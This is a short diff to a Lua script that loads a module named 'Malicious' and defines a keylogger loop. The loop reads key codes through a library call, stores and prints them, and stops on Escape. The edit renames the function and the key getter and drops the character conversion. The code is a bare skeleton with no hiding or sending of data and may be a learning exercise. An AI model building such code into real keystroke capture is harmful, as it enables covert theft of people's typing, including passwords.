@@ -1,21 +1,19 @@
 ﻿local mylib = require("Malicious")
 
-function Keylogger()
+function keylogger()
 	
 	local Pressed = {}
 
 	while true do
-		local key = mylib.getKey()
+		local key = mylib.pegaChave()
 
 		if(key==27) then
 			break
 		end
 
-		local charKey = mylib.toKey(key)
+		table.insert(Pressed,key)
 
-		table.insert(Pressed,charKey)
-
-		print(charKey);
+		print(key);
 
 	end
 
